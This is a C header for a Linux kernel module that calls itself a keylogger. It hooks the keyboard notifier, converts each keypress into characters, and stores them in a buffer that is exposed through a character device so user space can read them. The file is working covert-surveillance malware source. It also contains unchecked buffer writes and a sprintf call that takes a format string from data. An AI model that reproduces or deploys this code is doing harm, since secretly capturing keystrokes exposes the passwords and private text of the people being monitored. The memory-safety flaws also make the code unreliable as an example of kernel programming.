#ifndef KEYLOGGER
#define KEYLOGGER
#include <linux/input.h>
#include <linux/err.h>
#include <linux/keyboard.h>
#include <linux/module.h>
#include <linux/keyboard.h>
#include <linux/debugfs.h>
#include <linux/kernfs.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/err.h>
#include <linux/cdev.h>
#include <linux/semaphore.h>
#include "keys.h"
#define BUFF_SIZE (PAGE_SIZE << 2)
#define DEVICE_NAME "Keylogger"
static char msg_Ptr[BUFF_SIZE];
static size_t buf_pos;

struct fake_device
{
    char data[100];
    struct semaphore sem;
    
} virtual_device;

struct cdev *mcdev;
int major_number;
int ret;
dev_t dev_num;




int device_open(struct inode *inode, struct file * filp)
{
    //using mutex for allow only open process to use
    if (down_interruptible(&virtual_device.sem) != 0)
    {
        printk(KERN_ALERT "Keylogger: could not lock the device during open");
        return -1;
    }
    printk(KERN_INFO "Keylogger: opend device");
    return 0;
}

ssize_t device_write(struct file *flip, const char * buff_sorce_data, size_t buff_count, loff_t * offset)
{
    printk(KERN_INFO "Keylogger: writing to device");
    ret = copy_from_user(virtual_device.data, buff_sorce_data, buff_count);
    return ret;
}
int device_close(struct inode *inode, struct file *flip)
{
    //release the mutex
    up(&virtual_device.sem);
    printk(KERN_INFO "Keylogger: closed device");
    return 0;
} 
static ssize_t device_read(struct file *filp, char __user * buffer, size_t length, loff_t *offset)
{
    /*
    int bytes_read=0;
    if (*msg_Ptr ==0) return 0;
    while (length && *msg_Ptr){
        put_user(*(msg_Ptr++), buffer++);
        length--;
        bytes_read++;
    }
    printk(KERN_ALERT "Keylogger: dvice read execute");
    return bytes_read;*/
    printk(KERN_ALERT "Keylogger: dvice read execute");
    
    return simple_read_from_buffer(buffer, length, offset, msg_Ptr, buf_pos);
}
static struct file_operations fops =
{
    .owner = THIS_MODULE, 
    .read = device_read,
    .write = device_write,
    .release = device_close,
    .open = device_open
};
static int driver_entry(void)
{
    ret = alloc_chrdev_region(&dev_num, 0, 1, DEVICE_NAME);
    if (ret < 0)
    {
        printk(KERN_ALERT "Keylogger: failed to allocate a major number");
        return ret;
    }
    major_number = MAJOR(dev_num);
    printk(KERN_INFO "Keylogger: major number is %d", major_number);
    printk(KERN_INFO "\t use\\mknod /dev/%s c %d for device fike", DEVICE_NAME, major_number);
    mcdev = cdev_alloc();
    mcdev->ops = &fops;
    mcdev->owner = THIS_MODULE;
    ret = cdev_add(mcdev, dev_num, 1);
    if (ret < 0)
    {
        printk(KERN_ALERT "Keylogger: unable to add cdev to kernel");
        return -1;
    }
    sema_init(&virtual_device.sem, 1);
    return 0;

}
static void driver_exit(void)
{
    cdev_del(mcdev);
    unregister_chrdev_region(dev_num, 1);
    printk(KERN_ALERT "Keylogger: unloaded module");

}


int len;

int keycode_to_string(int key_press, int shift, char* buff)
{

    char* tav;  
    if (shift)
    {
        /*hundle as shift*/
        tav = keycode[key_press][1];
    }
    else
    {
        tav = keycode[key_press][0];
    }
        len = sprintf(buff,tav);
        return len;    
    
}
int notifier(struct notifier_block *block, unsigned long code, void *p)
{
    struct keyboard_notifier_param *param =(struct keyboard_notifier_param*) p;
    char keybuffer[12] = {0};

    if (!(param->down))
        return NOTIFY_OK;

    if (code == KBD_KEYCODE)
    {
        len = keycode_to_string(param->value, param->shift, keybuffer) ;  
        if (strlen(keybuffer)> 0 && len)
        {
            printk(KERN_ALERT "notifer type to msg ptr");
            strncpy(msg_Ptr+ buf_pos, keybuffer, len);
            buf_pos+=len;
            
                    
        }

    }
    return NOTIFY_OK;
}
#endif